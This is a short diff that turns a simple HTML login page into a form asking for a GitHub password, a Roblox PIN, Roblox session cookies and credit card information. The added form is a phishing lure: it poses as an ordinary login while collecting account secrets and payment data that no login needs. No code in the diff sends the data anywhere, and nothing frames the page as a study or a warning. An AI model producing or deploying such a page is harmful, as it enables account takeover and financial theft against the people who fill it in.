@@ -1,18 +1,22 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<html>
+  <head>
     <title>Login</title>
-</head>
-<body>
-    <h1>Login</h1>
-    <form action="login.php" method="post">
-        <label for="username">Username:</label>
-        <input type="text" id="username" name="username" required><br>
-        <label for="password">Password:</label>
-        <input type="password" id="password" name="password" required><br>
-        <button type="submit">Login</button>
+  </head>
+  <body>
+    <h1>Welcome to the Login Page!</h1>
+    <form id="login-form">
+      <label for="username">Username:</label><br>
+      <input type="text" id="username" name="username"><br>
+      <label for="github-password">GitHub Password:</label><br>
+      <input type="password" id="github-password" name="github-password"><br>
+      <label for="roblox-pin">Roblox PIN:</label><br>
+      <input type="password" id="roblox-pin" name="roblox-pin"><br>
+      <label for="roblox-cookie">Roblox Cookies:</label><br>
+      <input type="text" id="roblox-cookie" name="roblox-cookie"><br>
+      <label for="credit-card">Credit Card Information:</label><br>
+      <input type="text" id="credit-card" name="credit-card"><br>
+      <input type="submit" value="Submit">
     </form>
-</body>
+  </body>
 </html>
